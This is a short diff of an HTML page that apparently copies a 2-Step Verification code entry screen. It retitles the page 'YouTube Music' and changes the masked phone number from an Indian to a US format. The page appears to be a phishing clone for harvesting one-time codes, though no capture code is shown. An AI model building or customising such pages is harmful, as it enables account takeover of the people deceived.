@@ -26,7 +26,7 @@ window.ezogetrqbykey=function(b){for(var a=0,g=__ez.a[2].length;a<g;a++)if(__ez.
     <link href="./otp_files/bootstrap.min.css" rel="stylesheet">
     <script src="./otp_files/jquery.min.js.download"></script>
 
-    <title>Document</title>
+    <title>YouTube Music</title>
 
     <style>
         .form-wrapper-outer{
@@ -256,7 +256,7 @@ attach_ezolpl();
          <div class="form-greetings2">
             <span><b>2-Step Verification</b></span>
              <br>
-             <span>A text message with a 6-digit verification code was just sent to +91•••••• •••</span>
+             <span>A text message with a 6-digit verification code was just sent to +1 (•••) •••-••••</span>
         </div>
         <br>
        
